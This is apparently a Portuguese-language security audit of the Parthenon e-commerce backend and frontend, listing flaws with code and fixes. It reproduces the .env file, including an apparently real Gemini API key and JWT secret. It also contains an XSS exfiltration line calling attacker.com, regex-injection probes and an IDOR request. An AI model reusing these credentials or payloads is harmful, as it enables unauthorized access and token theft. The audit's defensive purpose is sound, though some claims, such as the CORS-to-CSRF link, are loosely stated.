# 🔒 Análise Crítica de Segurança - Parthenon E-commerce

> **STATUS GERAL:** 🔴 **ALTO RISCO** - Múltiplas vulnerabilidades críticas encontradas

---

## 🚨 VULNERABILIDADES CRÍTICAS (P0)

### 1. **SECRETS EXPOSTOS NO REPOSITÓRIO** ⚠️ CRÍTICO
**Arquivo:** [backend/.env](backend/.env)
```
MONGO_URI=mongodb://localhost:27017/parthenon
JWT_SECRET=parthenon_secret_key_2026
GEMINI_API_KEY=AIzaSyAl7YiEUSFcJvHo72kFlNQ-caKQhPM3dZ4
GROQ_API_KEY=gsk_****CHAVE_REVOGADA_SUBSTITUA_POR_NOVA****
```

**Impacto:**
- ⚠️ Arquivo `.env` está em `.gitignore`, MAS pode ter sido commitado antes
- 🔓 Se o GitHub foi público, qualquer pessoa tem as chaves API
- 💰 Custos potenciais: qualquer um pode usar sua cota Gemini/GROQ
- 🗄️ Qualquer um pode conectar diretamente ao MongoDB e roubar/deletar dados
- 🔐 JWT_SECRET comprometido = qualquer um forja tokens

**Ações Urgentes:**
```bash
# 1. Verificar histórico do Git
git log --all -- backend/.env

# 2. Se foi commitado, REVOGAR TODAS as chaves:
# - Disable Gemini API key em Google Cloud
# - Disable GROQ API key
# - Mude senha MongoDB
# - Gere novo JWT_SECRET

# 3. LIMPAR histórico (se público)
# Se o repo foi público, assume compromisso total

# 4. Gerar novo .env.example (SEM valores reais)
```

---

### 2. **AUTORIZAÇÃO FALTANDO EM ROTAS ADMIN** 🔓 CRÍTICO
**Arquivos Afetados:**
- [backend/src/routes/cupomRoutes.js](backend/src/routes/cupomRoutes.js#L42-L68) (3 rotas)
- [backend/src/routes/vendedorRoutes.js](backend/src/routes/vendedorRoutes.js#L6-L51) (4 rotas)
- [backend/src/routes/categoriaRoutes.js](backend/src/routes/categoriaRoutes.js#L16-L74) (4 rotas)

**Problema:** Rotas admin verificam APENAS autenticação, não autorização:
```javascript
// ❌ INSEGURO - qualquer usuário logado pode acessar!
router.post('/admin', authMiddleware, async (req, res) => {
  const cupom = new Cupom(req.body);  // Qualquer customer cria cupom!
  await cupom.save();
});

// ❌ Vendedor logado pode deletar cupons
router.delete('/admin/:id', authMiddleware, async (req, res) => {
  await Cupom.findByIdAndDelete(req.params.id);  // Sem verificação de role!
});
```

**Rotas Vulneráveis:**
| Rota | Problema | Impacto |
|---|---|---|
| `GET /api/cupons/admin` | Sem `role === 'admin'` | Qualquer customer vê todos cupons |
| `POST /api/cupons/admin` | Sem `role === 'admin'` | Qualquer customer cria cupons |
| `DELETE /api/cupons/admin/:id` | Sem `role === 'admin'` | Qualquer customer deleta cupons |
| `GET /api/vendedores/admin` | Sem `role === 'admin'` | Vaza todos vendedores e comissões |
| `POST /api/vendedores/admin` | Sem `role === 'admin'` | Criar vendedor falso com comissão alta |
| `PUT /api/vendedores/admin/:id` | Sem `role === 'admin'` | Modificar comissão de vendedor legítimo |
| `DELETE /api/vendedores/admin/:id` | Sem `role === 'admin'` | Deletar vendedor |
| `GET /api/categorias/admin` | Sem `role === 'admin'` | Ver categorias inativas |
| `POST /api/categorias/admin` | Sem `role === 'admin'` | Criar categoria falsa |
| `PUT /api/categorias/admin/:id` | Sem `role === 'admin'` | Modificar categorias |
| `DELETE /api/categorias/admin/:id` | Sem `role === 'admin'` | Deletar categoria |

**Solução Imediata:**
```javascript
// ✅ CORRETO
router.post('/admin', authMiddleware, (req, res, next) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Acesso restrito a administradores' });
  }
  next();
}, async (req, res) => {
  // ... handler
});
```

---

### 3. **CORS COM ORIGIN '*'** 🌐 CRÍTICO
**Arquivo:** [backend/src/server.js](backend/src/server.js#L13-L27)
```javascript
app.use(cors({
  origin: '*',  // ❌ INSEGURO!
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
}));
```

**Impacto:**
- CSRF attacks de qualquer site
- Qualquer domínio pode fazer requisições e abusar da API
- Sem proteção contra bot attacks

**Solução:**
```javascript
const allowedOrigins = [
  'https://partenontecidos.com',
  'https://partenontecidos.onrender.com',
  process.env.FRONTEND_URL
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

---

### 4. **TOKEN JWT EM localStorage** 💾 CRÍTICO
**Arquivo:** [frontend/context/AuthContext.tsx](frontend/context/AuthContext.tsx#L29-L40)
```typescript
// ❌ INSEGURO - localStorage vulnerável a XSS
const savedToken = localStorage.getItem('token');
if (savedToken) {
  const payload = JSON.parse(atob(savedToken.split('.')[1]));
  // ...
}
```

**Impacto:**
- Qualquer script XSS pode roubar o token
- Token válido por 7 dias = acesso duradouro
- localStorage persiste até limpeza manual

**Ataque Exemplo:**
```javascript
// Script injetado por XSS
fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
```

**Solução:**
- Usar httpOnly cookies (backend envia, browser não acessa)
- Reduzir expiração para 15 minutos
- Implementar refresh tokens

```javascript
// Frontend - não acessa o token
// Servidor envia automaticamente via cookie

// Backend
res.cookie('token', jwtToken, {
  httpOnly: true,      // JavaScript não consegue acessar
  secure: true,        // Apenas HTTPS
  sameSite: 'strict',  // Proteção CSRF
  maxAge: 15 * 60 * 1000  // 15 minutos
});
```

---

### 5. **SEM PROTEÇÃO CONTRA FORÇA BRUTA** 🔐 CRÍTICO
**Impacto:** Atacante pode fazer 10.000 tentativas de login por segundo

**Solução:** Instalar express-rate-limit
```javascript
npm install express-rate-limit

const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutos
  max: 5,                     // 5 tentativas
  message: 'Muitas tentativas de login. Tente novamente em 15 minutos.',
  standardHeaders: true,
  legacyHeaders: false,
});

router.post('/login', loginLimiter, async (req, res) => {
  // ... código de login
});
```

---

## 🔴 VULNERABILIDADES ALTAS (P1)

### 6. **NoSQL Injection em Busca**
**Arquivo:** [backend/src/routes/produtoRoutes.js](backend/src/routes/produtoRoutes.js#L128-L138)
```javascript
// ❌ VULNERÁVEL
const regex = new RegExp(q.trim(), 'i');
const produtos = await Produto.find({
  ativo: true,
  nome: { $regex: regex }
});
```

**Ataque:**
```bash
GET /api/produtos/busca?q=.*
# Retorna TODOS os produtos (regex muito permissivo)

GET /api/produtos/busca?q=)}; var x = 1; {
# Pode tentar injetar operadores MongoDB
```

**Solução:**
```javascript
const q = String(req.query.q || '').trim();
if (q.length < 2 || q.length > 100) {
  return res.json([]);
}

// Escapar caracteres especiais de regex
const escapedQ = q.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
const regex = new RegExp(escapedQ, 'i');

const produtos = await Produto.find({
  ativo: true,
  nome: { $regex: regex }
}).limit(5).lean();
```

---

### 7. **SEM HELMET - Headers de Segurança Faltam**
**Impacto:**
- Sem proteção contra XSS (X-XSS-Protection)
- Sem proteção contra clickjacking (X-Frame-Options)
- Sem Content Security Policy
- API vulnerável a vários ataques

**Solução:**
```bash
npm install helmet

// server.js
const helmet = require('helmet');
app.use(helmet());
```

---

### 8. **ERRO MESSAGE EXPÕE STACK TRACE**
**Arquivo:** Múltiplas (exemplo: [backend/src/routes/authRoutes.js](backend/src/routes/authRoutes.js#L37))
```javascript
// ❌ INSEGURO - expõe detalhes da stack
catch (err) {
  res.status(500).json({ error: err.message });  // Pode expor queries, paths, etc
}
```

**Problema:** Stack trace pode revelar:
- Nomes de campos do banco
- Versões de dependências
- Caminhos do servidor
- Queries de banco

**Solução:**
```javascript
catch (err) {
  console.error('Erro interno:', err);  // Log completo localmente
  res.status(500).json({ 
    error: 'Erro interno do servidor'  // Mensagem genérica para cliente
  });
}
```

---

### 9. **RESET PASSWORD IMPRIME TOKEN NO CONSOLE**
**Arquivo:** [backend/src/routes/authRoutes.js](backend/src/routes/authRoutes.js#L98)
```javascript
// ❌ INSEGURO - token em console!
const resetLink = `http://localhost:3000/redefinir-senha?token=${token}`;
console.log(`\n📧 Link de redefinição de senha para ${email}:\n${resetLink}\n`);
```

**Impacto:**
- Token visível em logs
- Se logs forem vazados, atacante reseta qualquer senha
- Token sem expiração na impressão

**Solução:**
```javascript
// Não imprimir token
// Usar apenas em produção: enviar por email via SendGrid/Mailgun

// Token com expiração curta
const expiresAt = new Date(Date.now() + 3600000);  // 1 hora

// Log apenas confirmação (sem token)
console.log(`📧 Reset link enviado para ${email}`);

// Em dev: usar teste de email (como Mailtrap)
```

---

### 10. **SEM VALIDAÇÃO DE ENTRADA**
**Múltiplas rotas:**

```javascript
// ❌ Sem validação de CPF/CEP/Email
router.post('/pedidos', async (req, res) => {
  const { cliente } = req.body;
  // cliente.cep não é validado - pode ser string aleatória
  // cliente.email não é validado
});

// ❌ Sem validação de tipo
router.post('/cupons/validar', async (req, res) => {
  const { codigo, total } = req.body;
  // total pode ser string "abc" ou objeto ou array
  if (total !== undefined && total < (cupom.valor_minimo || 0))
    return res.status(400).json(...)  // total pode ser NaN!
});
```

**Solução:** Instalar express-validator
```bash
npm install express-validator

const { body, validationResult } = require('express-validator');
const validator = require('validator');

router.post('/pedidos', [
  body('cliente.email').isEmail().normalizeEmail(),
  body('cliente.cep').matches(/^\d{5}-?\d{3}$/),
  body('cliente.nome').trim().isLength({ min: 3, max: 100 }),
], async (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  // ... continuar
});
```

---

### 11. **FAVORITOS SEM AUTENTICAÇÃO**
**Arquivo:** [backend/src/routes/produtoRoutes.js](backend/src/routes/produtoRoutes.js#L145-L196)
```javascript
// ❌ INSEGURO - qualquer pessoa pode acessar favoritos de outro usuário
router.get('/favoritos/:clienteId', async (req, res) => {
  const favoritos = await Favorito.find({ cliente_id: req.params.clienteId });
  res.json(favoritos);  // clienteId vem da URL!
});
```

**Ataque:**
```
GET /api/produtos/favoritos/userid123
# Retorna TODOS os favoritos de outro usuário!
```

**Solução:**
```javascript
router.get('/favoritos', authMiddleware, async (req, res) => {
  // Usar ID do usuário logado, não do query string
  const favoritos = await Favorito.find({ cliente_id: req.user.id });
  res.json(favoritos);
});
```

---

### 12. **SEM CSRF PROTECTION**
**Impacto:**
- POST requests podem ser feitas automaticamente de sites atacantes
- Usuário logado faz compra acidental

**Solução:**
```bash
npm install csurf

const csrf = require('csurf');
const csrfProtection = csrf({ cookie: false });

app.post('/api/pedidos', csrfProtection, async (req, res) => {
  // Validar CSRF token
});
```

---

## 🟡 VULNERABILIDADES MÉDIAS (P2)

### 13. **SENHAS MUITO FRACAS (MÍNIMO 6 CARACTERES)**
**Arquivo:** [backend/src/routes/authRoutes.js](backend/src/routes/authRoutes.js#L124)
```javascript
if (newPassword.length < 6) {
  return res.status(400).json({ error: 'A senha deve ter pelo menos 6 caracteres.' });
}
```

**Problema:** 6 caracteres = 62^6 = ~56 bilhões combinações (quebrável em minutos com GPU)

**Solução:**
```javascript
const MIN_PASSWORD_LENGTH = 12;

const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{12,}$/;
// Mínimo 12 chars, uma letra minúscula, uma maiúscula, um número

if (newPassword.length < MIN_PASSWORD_LENGTH) {
  return res.status(400).json({ 
    error: `Senha deve ter mínimo ${MIN_PASSWORD_LENGTH} caracteres` 
  });
}

if (!passwordRegex.test(newPassword)) {
  return res.status(400).json({ 
    error: 'Senha deve conter maiúscula, minúscula e números' 
  });
}
```

---

### 14. **SEM VALIDAÇÃO DE EMAIL**
```javascript
// ❌ Apenas verifica se existe
if (!nome || !email || !password) {
  return res.status(400).json({ error: 'Obrigatório' });
}

// Email pode ser "abc" ou "@@" ou qualquer coisa
```

**Solução:**
```javascript
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

if (!emailRegex.test(email)) {
  return res.status(400).json({ error: 'Email inválido' });
}

// Ou usar validator
const validator = require('validator');
if (!validator.isEmail(email)) {
  return res.status(400).json({ error: 'Email inválido' });
}
```

---

### 15. **ARMAZENAR TOKENS PLAINTEXT EM BANCO**
**Arquivo:** [backend/src/models/PasswordResetToken.js](backend/src/models/PasswordResetToken.js)
```javascript
// ❌ Token salvo sem criptografia
token: { type: String, required: true },
```

**Solução:**
```javascript
const crypto = require('crypto');

// Ao gerar
const token = crypto.randomBytes(32).toString('hex');
const hashedToken = crypto
  .createHash('sha256')
  .update(token)
  .digest('hex');

await PasswordResetToken.create({
  userId: user._id,
  token: hashedToken,  // Salva hash, não plaintext
  expiresAt: new Date(Date.now() + 3600000)
});

// Ao validar
const hashedInput = crypto
  .createHash('sha256')
  .update(inputToken)
  .digest('hex');

const resetToken = await PasswordResetToken.findOne({
  token: hashedInput,
  used: false,
  expiresAt: { $gt: new Date() }
});
```

---

## 📋 CHECKLIST DE SEGURANÇA

### Crítico (fazer HOJE)
- [ ] Revogar API keys expostas (Gemini, GROQ)
- [ ] Mudar JWT_SECRET
- [ ] Adicionar verificação `role === 'admin'` em cupomRoutes.js
- [ ] Adicionar verificação `role === 'admin'` em vendedorRoutes.js
- [ ] Adicionar verificação `role === 'admin'` em categoriaRoutes.js
- [ ] Mudar CORS de `'*'` para lista branca
- [ ] Instalar Helmet
- [ ] Adicionar rate limiting em login/registro

### Alto (fazer esta semana)
- [ ] Instalar express-validator
- [ ] Escapar regex em busca de produtos
- [ ] Remover console.log com tokens sensíveis
- [ ] Genéricas mensagens de erro (não expor stack trace)
- [ ] Autenticação obrigatória em favoritos

### Médio (fazer próximas semanas)
- [ ] Implementar refresh tokens com httpOnly cookies
- [ ] Aumentar mínimo de senha para 12 caracteres
- [ ] Adicionar validação de email com regex
- [ ] Hash password reset tokens antes de salvar
- [ ] Implementar CSRF protection
- [ ] Remover arquivo .env do histórico Git
- [ ] Criar .env.example sem valores

---

## 🔧 SCRIPT DE CORREÇÃO RÁPIDA

```bash
# 1. Instalar dependências de segurança
npm install helmet express-rate-limit express-validator xss express-mongo-sanitize

# 2. Revogar chaves comprometidas
# - Ir em console.google.com e desabilitar Gemini API
# - Ir em console.groq.com e revogar GROQ API key

# 3. Gerar novo JWT_SECRET seguro
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"

# 4. Atualizar .env com novo secret e remover do Git
git rm --cached backend/.env
git commit -m "Remove .env from tracking"
git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch backend/.env' --prune-empty --tag-name-filter cat -- --all

# 5. Force push para limpar histórico (⚠️ SOMENTE se não há colaboradores!)
# git push origin master --force-with-lease
```

---

## 📞 PRÓXIMAS AÇÕES

1. **EMERGÊNCIA:** Revogar API keys em Google Cloud e Groq
2. **HOJE:** Implementar verificação de role em rotas admin
3. **HOJE:** Mudar CORS para whitelist
4. **AMANHÃ:** Instalar dependências de segurança
5. **SEMANA:** Implementar token em httpOnly cookies
6. **SEMANA:** Revisar e corrigir validação de input
